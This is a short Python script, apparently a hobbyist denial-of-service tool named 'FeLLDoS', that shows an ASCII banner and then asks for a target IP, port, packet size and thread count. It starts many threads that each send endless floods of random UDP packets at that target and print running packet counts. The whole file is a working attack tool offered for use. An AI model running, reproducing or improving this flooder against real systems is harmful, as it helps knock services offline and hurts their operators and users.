import socket
import os
import pyfiglet
import random
import threading
from time import sleep

os.system("pyfiglet --color=RED FeLLDoS")
print("By: frpitu | For The Fellzinkkj")
sleep(3.0)

# <( DDoS Informations )>
ip = str(input("Address: "))
porta = int(input("Port: "))
pack = int(input("Packets Quantity: "))
thread_count = int(input("Threads Quantity: "))

def start():
    xx = 0
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(pack)
            s.sendto(data, (ip, porta))
            for i in range(pack):
                s.sendto(data, (ip, porta))
                xx += 1
            print("Attacking", ip, "on Port", porta, "with", pack, "Packets &", thread_count, "Threads. Packets Sent:", xx)
        except Exception as e:
            s.close()
            print('Done', str(e))

threads = []
for x in range(thread_count):
    thread = threading.Thread(target=start)
    thread.start()
    threads.append(thread)

# Wait for all threads to finish
for thread in threads:
    thread.join()